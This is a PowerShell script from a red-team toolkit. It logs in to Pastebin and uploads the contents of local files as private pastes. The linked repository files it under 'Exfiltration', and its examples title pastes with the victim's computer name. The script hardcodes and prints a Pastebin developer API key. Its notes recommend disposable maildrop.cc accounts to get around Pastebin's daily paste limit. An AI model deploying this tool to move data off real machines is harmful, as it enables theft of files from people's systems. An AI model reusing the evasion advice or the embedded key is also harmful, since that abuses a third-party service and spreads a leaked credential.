<# 
.SYNOPSIS
   Authenticates to PasteBin.com, and uploads text data to PasteBin

   Author: @r00t-3xp10it
   Credits: @BankSecurity
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.6

.DESCRIPTION
   Uses the PasteBin API to take content from a file and create a new
   paste from it, including expiration, format, visibility, and title.

.NOTES
   PasteBin accepts the max of 20 pastes per day on 'free' accounts.
   Use 'whatever@maildrop.cc' to create new pastebin accounts to be
   abble to bypass the pastebin '20 pasts per day' restriction.

.PARAMETER InputObject
   Content to paste to Pastebin

.PARAMETER Visibility
   Public, Private, or Unlisted visibility for the new paste

.PARAMETER Format
   The format of the paste for syntax highlighting

.PARAMETER ExpiresIn
   Never: N, 10 Minutes: 10M, 1 Hour: 1H, 1 Day: 1D, 1 Week: 1W, 2 Weeks: 2W, 1 Month: 1M

.PARAMETER PasteTitle
   Title text for the paste

.PARAMETER OpenInBrowser
   Open the paste URL in the default browser

.PARAMETER PastebinUsername
   PasteBin UserName to authenticate to

.PARAMETER PastebinPassword
   PasteBin Password to authenticate to

.PARAMETER PastebinDeveloperKey
   The pasteBin API key to authenticate

.EXAMPLE
   Import-Module -Name .\Out-Pastebin.ps1 -Force

   Single file:
   Out-Pastebin -InputObject $(Get-Content C:\to_be_uploaded.txt) -PasteTitle "TOP" -ExpiresIn "10M" -Visibility "Private" -PastebinUsername "r00t-3xp10it" -PastebinPassword "mypastebinpass"

   Multiple files:
   Out-Pastebin -InputObject $(Get-Content C:\to_be_uploaded.txt, C:\to_be_uploaded2.txt) -PasteTitle "$Env:COMPUTERNAME" -ExpiresIn "10M" -Visibility "Private" -PastebinUsername "r00t-3xp10it" -PastebinPassword "mypastebinpass"

.INPUTS
   -InputObject 'string' accepts pipeline commands

.OUTPUTS
   * Out-PasteBin cmdlet by BankSecurity
   * PastebinDeveloperKey : 1ab4a1a4e39c94db4f653127a45e7159
     + PastebinUsername   : r00t-3xp10it
     + PasteTitle         : SKYNET
   * PasteBin Url: https://pastebin.com/2Th9FFTW
   * PasteBin accepts the max of 20 pastes per day.

.LINK
   https://github.com/r00t-3xp10it/redpill/blob/main/bin/Out-Pastebin.ps1
   https://github.com/BankSecurity/Red_Team/blob/master/Exfiltration/Out-Pastebin.ps1
#>


$cmdletVersion = "v1.0.6"
$ErrorActionPreference = "SilentlyContinue"
$host.UI.RawUI.WindowTitle = "@Out-PasteBin $cmdletVersion {SSA@RedTeam}"

## PasteBin Access Tokens
# $PastebinDeveloperKey = '1ab4a1a4e39c94db4f653127a45e7159'
$PastebinPasteURI = 'https://pastebin.com/api/api_post.php'
$PastebinLoginUri = "https://pastebin.com/api/api_login.php"


Function Script:EncodeForPost ( [Hashtable]$KeyValues )
{
    @(  
        ForEach($KV in $KeyValues.GetEnumerator())
        {
            "{0}={1}" -f @(
            $KV.Key, $KV.Value |
            ForEach-Object { [System.Web.HttpUtility]::UrlEncode( $_, [System.Text.Encoding]::UTF8 ) }
            )
        }
    ) -join '&'
}


Function Out-Pastebin
{
    [CmdletBinding()]
   
    Param
    (
        [Parameter(Mandatory=$False, ValueFromPipeline=$True)]
        [AllowEmptyString()]
        [String[]]
        $InputObject,

        [String]
        $PastebinDeveloperKey = '1ab4a1a4e39c94db4f653127a45e7159',

        [ValidateSet('Public', 'Unlisted', 'Private')]
        [String]
        $Visibility = 'Unlisted',
       
        [ValidateSet('N', '10M', '1H', '1D', '1W', '2W', '1M')]
        [String]
        $ExpiresIn = '1D',

        [Parameter(Mandatory=$True)]
        [String]
        $PasteTitle,

        [Parameter(Mandatory=$True)]
        [String]
        $PastebinUsername,

        [Parameter(Mandatory=$True)]
        [String]
        $PastebinPassword,

        [String]
        $Format,

        [Switch]
        $OpenInBrowser,
       
        [Switch]
        $PassThru
    )
   
    Begin
    {
        write-host "`n* Out-PasteBin cmdlet by " -ForegroundColor Green -NoNewline;        
        write-host "B" -ForegroundColor DarkYellow -NoNewline;write-host "ank" -ForegroundColor DarkGray -NoNewline;
        write-host "S" -ForegroundColor DarkYellow -NoNewline;write-host "ecurity" -ForegroundColor DarkGray

        #Check for 'InputObject' parameter declaration!
        If(-not($InputObject) -or $InputObject -eq $null)
        {
           write-host "* Error:" -ForegroundColor Red -NoNewline;
           write-host " Wrong -inputObject '" -ForegroundColor DarkGray -NoNewline;
           write-host "string" -ForegroundColor DarkYellow -NoNewline;
           write-host "' input.`n" -ForegroundColor DarkGray
           Break
        }

        #Authentication Url Api
        $Authenticate = "api_dev_key=$PastebinDeveloperKey&api_user_name=$PastebinUsername&api_user_password=$PastebinPassword";

        Add-Type -AssemblyName System.Web
        #Cmdlet mandatory Imports\requirement tests!
        If(-not(([appdomain]::currentdomain.GetAssemblies()).Location -iMatch '(System.Web.dll)$'))
        {
           write-host "* Error:" -ForegroundColor Red -NoNewline; 
           Write-Host " failed to load '" -ForeGroundColor DarkGray -NoNewline;
           Write-Host "System.Web.dll" -ForeGroundColor DarkYellow -NoNewline;
           Write-Host "'" -ForeGroundColor DarkGray
           Break
        }

        $script:s = Invoke-RestMethod -Uri $PastebinLoginUri -Body $Authenticate -Method Post
        $Post = [System.Net.HttpWebRequest]::Create($PastebinPasteURI)
        $Post.Method = "POST"
        $Post.ContentType = "application/x-www-form-urlencoded"
        [String[]]$InputText = @()
    }
   
    Process
    {
        ForEach($Line in $InputObject)
        {
            $InputText += $Line
        }
    }
   
    End
    {
        $Parameters = @{
            api_user_key   = $script:s;
            api_dev_key    = $PastebinDeveloperKey;
            api_option     = 'paste';
            api_paste_code = $InputText -join "`r`n";
            api_paste_name = $PasteTitle;
           
            api_paste_private = Switch($Visibility){ Public { '0' }; Unlisted { '1' }; Private { '2' }; };
            api_paste_expire_date = $ExpiresIn.ToUpper();
        }
       
        If($Format){ $Parameters[ 'api_paste_format' ] = $Format.ToLower() }
       
        $Content = EncodeForPost $Parameters
        $Post.ContentLength = [System.Text.Encoding]::ASCII.GetByteCount($Content)
        $WriteStream = New-Object System.IO.StreamWriter ($Post.GetRequestStream(), [System.Text.Encoding]::ASCII)
        $WriteStream.Write($Content)
        $WriteStream.Close()
       
        Try{
           #Send request, get response
           $Response = $Post.GetResponse()
           $ReadEncoding = [System.Text.Encoding]::GetEncoding($Response.CharacterSet)
           $ReadStream = New-Object System.IO.StreamReader ($Response.GetResponseStream(), $ReadEncoding)
       
           $Result = $ReadStream.ReadToEnd().TrimEnd()
           $ReadStream.Close()
           $Response.Close()
        }Catch{
           write-host "* Error:" -ForegroundColor Red -NoNewline;
           write-host " when uploading to pastebin ..`n" -ForegroundColor DarkGray
        }
       
        If($Result.StartsWith("http"))
        {
            If($OpenInBrowser)
            {
                Try { Start-Process -FilePath $Result } Catch { Throw $_ }
            }
            Else
            {
                $Result | clip.exe
            }
            
            #Print OnScreen
            write-host "* " -ForegroundColor Green -NoNewline;
            write-host "PastebinDeveloperKey : " -NoNewline;
            write-host "$PastebinDeveloperKey" -ForegroundColor DarkYellow;
            write-host "  + " -ForegroundColor Yellow -NoNewline;
            write-host "PastebinUsername   : $PastebinUsername";
            write-host "  + " -ForegroundColor Yellow -NoNewline;
            write-host "PasteTitle         : $PasteTitle";
            write-host "*" -ForegroundColor Green -NoNewline;
            write-host " PasteBin Url: " -ForegroundColor DarkGray -NoNewline;
            write-host "$Result" -ForegroundColor Green;
            write-host "* " -ForegroundColor Yellow -NoNewline;
            write-host "PasteBin accepts the max of 20 pastes per day.`n" -ForegroundColor DarkGray
        }
        Else
        {
            Throw "* Error when uploading to pastebin: {0} : {1}" -f $Result, $Response
            write-host "* Use 'whatever@maildrop.cc' to bypass paste restriction`n" -ForegroundColor Red
        }
    }
}